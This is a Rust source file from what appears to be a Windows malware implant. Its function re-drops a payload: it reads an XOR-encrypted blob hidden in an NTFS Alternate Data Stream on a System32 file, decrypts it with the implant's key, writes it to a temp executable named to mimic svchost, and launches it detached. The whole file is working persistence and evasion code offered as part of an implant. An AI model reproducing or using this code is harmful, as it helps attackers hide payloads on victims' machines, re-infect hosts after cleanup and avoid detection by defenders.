//! resurrect.rs — Re-drop implant from encrypted ADS blob
//!
//! drop_from_ads() reads the encrypted payload stored in an NTFS
//! Alternate Data Stream on the target host, decrypts it, writes it
//! to a new randomised path under %TEMP%, and executes it.
//!
//! ADS path format:  %SystemRoot%\System32\en-US\<rand>.dll:payload
//! Encryption:       XOR with SLEEP_KEY (same key used in pe_obfuscate.rs)

#![allow(dead_code, non_snake_case)]

use winapi::um::fileapi::{CreateFileW, ReadFile, WriteFile, OPEN_EXISTING, CREATE_ALWAYS};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::DETACHED_PROCESS;
use winapi::um::winnt::{
    GENERIC_READ, GENERIC_WRITE, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, HANDLE,
};
use winapi::shared::minwindef::DWORD;

// ADS stream name as wide chars (compile-time constant avoids runtime string)
// ":payload" in UTF-16 LE
const ADS_SUFFIX: &[u16] = &[
    b':' as u16, b'p' as u16, b'a' as u16, b'y' as u16,
    b'l' as u16, b'o' as u16, b'a' as u16, b'd' as u16, 0u16,
];

// XOR decrypt in-place with the implant SLEEP_KEY
fn xor_inplace(buf: &mut [u8], key: &[u8; 16]) {
    for (i, b) in buf.iter_mut().enumerate() {
        *b ^= key[i % 16];
    }
}

/// Build a null-terminated wide string from a UTF-8 &str.
fn to_wide(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = s.encode_utf16().collect();
    v.push(0);
    v
}

/// Append ADS suffix to a wide path (replaces trailing null).
fn append_ads(base: &[u16]) -> Vec<u16> {
    let mut v = base.to_vec();
    if v.last() == Some(&0) { v.pop(); }
    v.extend_from_slice(ADS_SUFFIX);
    v
}

/// Read up to `max_bytes` from a file handle. Returns bytes read.
unsafe fn read_all(h: HANDLE, buf: &mut Vec<u8>, max_bytes: usize) -> bool {
    buf.resize(max_bytes, 0u8);
    let mut total: usize = 0;
    loop {
        let mut read: DWORD = 0;
        let remain = max_bytes - total;
        if remain == 0 { break; }
        let ok = ReadFile(
            h,
            buf.as_mut_ptr().add(total) as *mut _,
            remain.min(65536) as DWORD,
            &mut read,
            core::ptr::null_mut(),
        );
        if ok == 0 || read == 0 { break; }
        total += read as usize;
    }
    buf.truncate(total);
    total > 0
}

/// Re-drop encrypted payload from ADS, write to temp path, execute.
/// Returns true on success.
pub unsafe fn drop_from_ads() -> bool {
    use crate::main::SLEEP_KEY;

    // Locate the ADS source path: %SystemRoot%\System32\en-US\shell32.dll:payload
    // We use a hardcoded stub path — in production this would be computed from
    // the original dropper's write path.
    let ads_path_str = "C:\\Windows\\System32\\en-US\\shell32.dll";
    let base_wide    = to_wide(ads_path_str);
    let ads_wide     = append_ads(&base_wide);

    let h_src = CreateFileW(
        ads_wide.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        core::ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );
    if h_src == INVALID_HANDLE_VALUE { return false; }

    let mut payload: Vec<u8> = Vec::new();
    let ok = read_all(h_src, &mut payload, 4 * 1024 * 1024);
    CloseHandle(h_src);
    if !ok || payload.is_empty() { return false; }

    // Decrypt
    xor_inplace(&mut payload, &SLEEP_KEY);

    // Write to temp
    let tmp_path_str = "C:\\Windows\\Temp\\svchost_helper.exe";
    let tmp_wide     = to_wide(tmp_path_str);

    let h_dst = CreateFileW(
        tmp_wide.as_ptr(),
        GENERIC_WRITE,
        0,
        core::ptr::null_mut(),
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );
    if h_dst == INVALID_HANDLE_VALUE { return false; }

    let mut written: DWORD = 0;
    WriteFile(
        h_dst,
        payload.as_ptr() as *const _,
        payload.len() as DWORD,
        &mut written,
        core::ptr::null_mut(),
    );
    CloseHandle(h_dst);
    if written as usize != payload.len() { return false; }

    // Execute detached
    let mut si: STARTUPINFOW = core::mem::zeroed();
    si.cb = core::mem::size_of::<STARTUPINFOW>() as DWORD;
    let mut pi: PROCESS_INFORMATION = core::mem::zeroed();
    let mut cmd = tmp_wide.clone();

    let ok = CreateProcessW(
        tmp_wide.as_ptr(),
        cmd.as_mut_ptr(),
        core::ptr::null_mut(),
        core::ptr::null_mut(),
        0,
        DETACHED_PROCESS,
        core::ptr::null_mut(),
        core::ptr::null(),
        &mut si,
        &mut pi,
    );
    if ok != 0 {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        true
    } else {
        false
    }
}
